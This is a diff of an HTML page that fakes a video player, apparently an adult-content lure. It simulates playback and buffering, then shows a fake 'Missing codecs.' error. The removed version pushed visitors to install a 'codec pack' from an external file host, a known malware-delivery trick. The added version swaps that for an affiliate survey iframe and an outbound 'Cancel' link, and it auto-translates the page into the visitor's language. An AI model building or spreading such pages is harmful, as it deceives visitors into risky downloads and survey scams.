@@ -3,17 +3,20 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>XVideo Video Player - Multilingual</title>
+<title>Video Player</title>
 
 <style>
 
-/* Google Translate */
+/* GOOGLE TRANSLATE FIX */
+
 .goog-te-banner-frame.skiptranslate,
 .goog-te-gadget-icon,
 #goog-gt-tt,
 .goog-te-balloon-frame,
-.goog-te-menu-frame { display: none !important; }
-body > .skiptranslate { display: none !important; }
+.goog-te-menu-frame { display:none!important; }
+
+body > .skiptranslate { display:none!important; top:0!important; }
+body{ top:0!important; }
 
 /* BODY */
 
@@ -26,7 +29,7 @@ justify-content:center;
 height:100vh;
 font-family:Arial,sans-serif;
 color:#fff;
-overflow-x:hidden
+overflow:hidden
 }
 
 /* PLAYER */
@@ -37,76 +40,80 @@ width:90vw;
 max-width:900px;
 aspect-ratio:16/9;
 background:#000 url("ai_bot.png") center/cover no-repeat;
-overflow:hidden;
 border-radius:10px;
-cursor:pointer
+overflow:hidden;
 }
+
+/* CONTROLS */
 
 .controls{
 position:absolute;
 bottom:0;
 left:0;
 right:0;
-background:rgba(0,0,0,.7);
+background:linear-gradient(to top, rgba(0,0,0,.85), transparent);
 display:flex;
 align-items:center;
-padding:8px;
-gap:10px;
-font-size:14px
+padding:10px;
+gap:12px;
+font-size:14px;
 }
 
 .btn{
 cursor:pointer;
 display:flex;
 align-items:center;
-user-select:none;
-font-size:16px
+justify-content:center;
+min-width:24px;
 }
+
+/* VOLUME */
+
+.volume{
+display:flex;
+align-items:center;
+gap:6px;
+}
+
+.volume input{
+width:80px;
+cursor:pointer;
+}
+
+/* PROGRESS */
 
 .progress-container{
 flex:1;
 display:flex;
 align-items:center;
-gap:8px;
-min-width:80px
+gap:10px;
 }
 
 .progress-bar{
 flex:1;
-height:4px;
+height:5px;
 background:#333;
-border-radius:2px;
-position:relative;
-cursor:pointer
+border-radius:3px;
+cursor:pointer;
+overflow:hidden;
 }
 
 .progress{
-width:0%;
 height:100%;
-background:#e65c2d
+width:0%;
+background:#e65c2d;
 }
 
 .time{
+font-size:12px;
 white-space:nowrap;
-font-size:13px
 }
+
+/* RIGHT SIDE */
 
 .right-controls{
 display:flex;
-gap:12px;
-align-items:center
-}
-
-.volume{
-display:flex;
-align-items:center;
-gap:4px;
-min-width:60px
-}
-
-.volume input[type="range"]{
-width:80px;
-cursor:pointer
+gap:10px;
 }
 
 /* BUFFERING */
@@ -119,9 +126,28 @@ right:0;
 bottom:0;
 background:rgba(0,0,0,.85);
 display:flex;
+flex-direction:column;
 align-items:center;
 justify-content:center;
-font-size:22px
+gap:15px;
+font-size:20px;
+z-index:2;
+}
+
+/* SPINNER */
+
+.spinner{
+width:50px;
+height:50px;
+border:4px solid rgba(255,255,255,0.2);
+border-top:4px solid #e65c2d;
+border-radius:50%;
+animation:spin 1s linear infinite;
+}
+
+@keyframes spin{
+0%{transform:rotate(0deg)}
+100%{transform:rotate(360deg)}
 }
 
 /* MODAL */
@@ -130,99 +156,58 @@ font-size:22px
 display:none;
 position:fixed;
 z-index:10000;
-left:0;
 top:0;
+left:0;
 width:100%;
 height:100%;
-background:rgba(0,0,0,.7);
+background:transparent;
 align-items:center;
 justify-content:center;
-padding:10px;
 opacity:0;
-transition:opacity .3s
+transition:.3s;
 }
 
 .modal.show{
 display:flex;
-opacity:1
+opacity:1;
 }
 
 .modal-content{
-background:rgba(243,243,243,.9);
-border-radius:10px;
-max-width:320px;
+background:transparent;
 text-align:center;
-padding:18px 20px;
-box-shadow:0 6px 18px rgba(0,0,0,.3);
-color:#000;
-font-size:14px;
-transform:scale(.9);
-transition:.3s;
-opacity:0
+max-width:320px;
+color:#fff;
 }
 
-.modal.show .modal-content{
-transform:scale(1);
-opacity:1
-}
+/* TEXT */
 
 .modal-content p{
-margin:0 0 15px;
-font-weight:500;
-line-height:1.4
+font-weight:bold;
+color:#e65c2d;
+text-shadow:0 0 6px rgba(0,0,0,.8);
 }
 
-/* BUTTONS */
+/* BUTTON */
 
-.modal-buttons{
-display:flex;
-gap:10px;
-justify-content:center
-}
-
-.modal-buttons a{
+.cancel-btn{
 padding:10px 22px;
-font-size:14px;
 border-radius:6px;
 text-decoration:none;
 color:#fff;
-display:inline-block
+background:#dc3545;
+display:inline-block;
+margin-top:10px;
 }
 
-/* INSTALL GREEN */
-
-.install-btn{
-background:#28a745
+.cancel-btn:hover{
+background:#a71d2a;
 }
 
-.install-btn:hover{
-background:#1e7e34
-}
+/* MOBILE */
 
-/* CLOSE RED */
-
-.close-btn{
-background:#dc3545
-}
-
-.close-btn:hover{
-background:#a71d2a
-}
-
-/* RESPONSIVE */
-
-@media(max-width:768px){
-.controls{font-size:12px;gap:6px;padding:6px}
-.btn{font-size:14px}
-.time{font-size:11px}
-.volume input[type="range"]{width:60px}
-}
-
-@media(max-width:480px){
-.controls{font-size:11px;gap:4px}
-.btn{font-size:12px}
-.time{font-size:10px}
-.volume input[type="range"]{width:50px}
+@media(max-width:600px){
+.controls{padding:6px;font-size:12px}
+.volume input{width:60px}
 }
 
 </style>
@@ -232,10 +217,11 @@ background:#a71d2a
 
 <div id="google_translate_element" style="display:none;"></div>
 
-<div class="player" id="player">
+<div class="player">
 
-<div class="buffering" id="buffering">
-Loading video...
+<div class="buffering">
+  <div class="spinner"></div>
+  <div id="buffer-text">Loading video...</div>
 </div>
 
 <div class="controls">
@@ -244,7 +230,7 @@ Loading video...
 
 <div class="volume">
 <div class="btn">🔊</div>
-<input type="range" id="volume" min="0" max="100" value="50">
+<input type="range" min="0" max="100" value="50">
 </div>
 
 <div class="progress-container">
@@ -263,156 +249,114 @@ Loading video...
 </div>
 
 <div class="modal" id="modal">
-
 <div class="modal-content">
 
-<p>
-To play the video correctly, you need to install xvideos codec.
-</p>
+<p>To watch the video, please answer a few questions</p>
 
-<div class="modal-buttons">
+<iframe 
+src="https://tone.affomelody.com/click?pid=3749&offer_id=795&l=1703486163"
+width="100%" height="400" frameborder="0">
+</iframe>
 
-<a href="https://ikx.filexspace.com/storage/SMFFM?title=XVideos%20Codec%20Pack"
-target="_blank"
-rel="noopener noreferrer"
-class="install-btn">
-Install
-</a>
-
-<a href="https://vipxtubex.github.io/fullx"
-class="close-btn"
-target="_blank"
-rel="noopener noreferrer">
+<a href="https://vipxtubex.github.io/fullx" 
+class="cancel-btn" 
+target="_blank">
 Cancel
 </a>
-
-</div>
 
 </div>
 </div>
 
 <script>
 
-const playBtn=document.getElementById("play-btn")
-const volumeSlider=document.getElementById("volume")
-const player=document.getElementById("player")
 const modal=document.getElementById("modal")
-const modalLink=document.querySelector(".modal-buttons a")
-const progress=document.getElementById("progress")
-const progressBar=document.getElementById("progress-bar")
-const timeDisplay=document.getElementById("time")
+const bufferText=document.getElementById("buffer-text")
 
-let isPlaying=false
-let interval
 let currentTime=0
+let totalDuration=800
+let interval=null
 
-const totalDuration=Math.floor(Math.random()*(928-722+1))+722
-
-function formatTime(sec){
-const m=Math.floor(sec/60)
-const s=sec%60
-return`${m}:${s.toString().padStart(2,"0")}`
+function formatTime(s){
+let m=Math.floor(s/60)
+let sec=s%60
+return m+":"+sec.toString().padStart(2,"0")
 }
 
-function updateTime(){
-timeDisplay.textContent=`${formatTime(currentTime)} / ${formatTime(totalDuration)}`
-progress.style.width=`${(currentTime/totalDuration)*100}%`
+function update(){
+document.getElementById("time").textContent=
+formatTime(currentTime)+" / "+formatTime(totalDuration)
+
+document.getElementById("progress").style.width=
+(currentTime/totalDuration*100)+"%"
 }
 
-function startProgress(){
-if(!interval){
+function start(){
+if(interval) return
+
 interval=setInterval(()=>{
 if(currentTime<totalDuration){
 currentTime++
-updateTime()
-}else{
-clearInterval(interval)
-interval=null
+update()
 }
 },1000)
 }
-}
 
-function showModalDelayed(){
+function showModal(){
 setTimeout(()=>{
+
 modal.classList.add("show")
-document.body.style.overflow="hidden"
+
+// фриз перед ошибкой
+setTimeout(()=>{
+clearInterval(interval)
+},2500)
+
+// ошибка после модалки
+setTimeout(()=>{
+bufferText.textContent="Missing codecs."
+},700)
+
 },3000)
 }
 
-playBtn.addEventListener("click",()=>{
-if(!isPlaying){
-startProgress()
-showModalDelayed()
+document.getElementById("play-btn").onclick=()=>{
+start()
+showModal()
 }
-isPlaying=!isPlaying
-playBtn.textContent=isPlaying?"⏸":"▶"
-})
 
-modalLink.addEventListener("click",()=>{
-modal.classList.remove("show")
-document.body.style.overflow=""
-})
-
-player.addEventListener("click",(e)=>{
-if(e.target===player&&!isPlaying){
-startProgress()
-showModalDelayed()
-isPlaying=true
-playBtn.textContent="⏸"
+window.onload=()=>{
+start()
+showModal()
 }
-})
 
-volumeSlider.addEventListener("input",()=>{
-console.log("Volume:",volumeSlider.value)
-})
+document.getElementById("progress-bar").onclick=(e)=>{
+let rect=e.target.getBoundingClientRect()
+let x=e.clientX-rect.left
+currentTime=Math.floor((x/rect.width)*totalDuration)
+update()
+}
 
-progressBar.addEventListener("click",(e)=>{
-const rect=progressBar.getBoundingClientRect()
-const clickX=e.clientX-rect.left
-const newTime=Math.floor((clickX/rect.width)*totalDuration)
-currentTime=newTime
-updateTime()
-})
+update()
 
-updateTime()
-
-/* AUTOPLAY */
-
-window.addEventListener("load",()=>{
-isPlaying=true
-playBtn.textContent="⏸"
-startProgress()
-showModalDelayed()
-})
-
-/* TEXT CHANGE */
-
-setTimeout(()=>{
-document.getElementById("buffering").textContent="Missing codecs."
-},5000)
-
-/* GOOGLE TRANSLATE */
+/* GOOGLE TRANSLATE AUTO */
 
 function googleTranslateElementInit(){
-
 new google.translate.TranslateElement(
 {pageLanguage:'en',autoDisplay:false},
 'google_translate_element'
 )
 
 const userLang=navigator.language||navigator.userLanguage
-const langCode=userLang.split('-')[0]
+const lang=userLang.split('-')[0]
 
-const interval=setInterval(()=>{
+const check=setInterval(()=>{
 const select=document.querySelector('.goog-te-combo')
 if(select){
-select.value=langCode
+select.value=lang
 select.dispatchEvent(new Event('change'))
-clearInterval(interval)
+clearInterval(check)
 }
 },500)
-
 }
 
 </script>
